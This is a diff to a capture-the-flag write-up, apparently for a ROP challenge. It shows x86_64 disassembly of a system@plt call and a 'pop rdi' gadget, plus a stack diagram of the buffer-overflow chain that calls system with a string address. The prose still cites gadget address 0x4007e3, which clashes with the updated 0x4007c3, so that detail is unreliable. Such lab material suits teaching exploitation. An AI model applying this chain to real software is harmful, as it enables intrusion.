@@ -20,18 +20,32 @@ The goal is to replace this argument with our usefulString.
 
 ## x86_64:
 ```asm
-0000000000400769 <ret2win + 0x13>:
-  400769:	e8 f2 fd ff ff   call   400560 <system@plt>
+000000000040074b <ret2win + 0x09>:
+  40074b:	e8 10 fe ff ff   call   400560 <system@plt>
 
-00000000004007e2 <__libc_csu_init + 0x62>:
-  4007e2:	41 5f            pop    r15
-  4007e4:	c3               ret
-
-// The 0x5f opcode is the one for 'pop rdi', the 0x41 byte is used to extend it
-to the second set of registers thus displaying a 'pop r15'. We can use 0x4007e3 as a
-'pop rdi' gadget.
+00000000004007c2 <__libc_csu_init + 0x62>:
+  4007c2:	41 5f            pop    r15
+  4007c4:	c3               ret    
 ```
-
+The 0x5f opcode is the one for `pop rdi`, the 0x41 byte is used to extend it
+to the second set of registers thus displaying a `pop r15`. We can use 0x4007e3 as a
+`pop rdi` gadget.   
+With all of this, we can craft our exploit.   
+```
+┌─────────────────────────┐  ┌─────────────────────────┐
+│ buffer                  │  │ 20 20 20 20 20 20 20 20 │
+│                         │  │ 20 20 20 20 20 20 20 20 │
+│                         │  │ 20 20 20 20 20 20 20 20 │
+├─────────────────────────┤  │ 20 20 20 20 20 20 20 20 │
+│ old_rbp                 │  │ 20 20 20 20 20 20 20 20 │
+├─────────────────────────┤  ├─────────────────────────┤
+│ ret                     │  │ 0x4007c3                │ <- pop rdi; ret
+├─────────────────────────┤  ├─────────────────────────┤
+│ ...                     │  │ 0x601060                │ <- usefulString address
+│                         │  ├─────────────────────────┤
+│                         │  │ 0x40074b                │ <- sytem call
+└─────────────────────────┘  └─────────────────────────┘
+```
 ## x86:
 
 ## ARM:
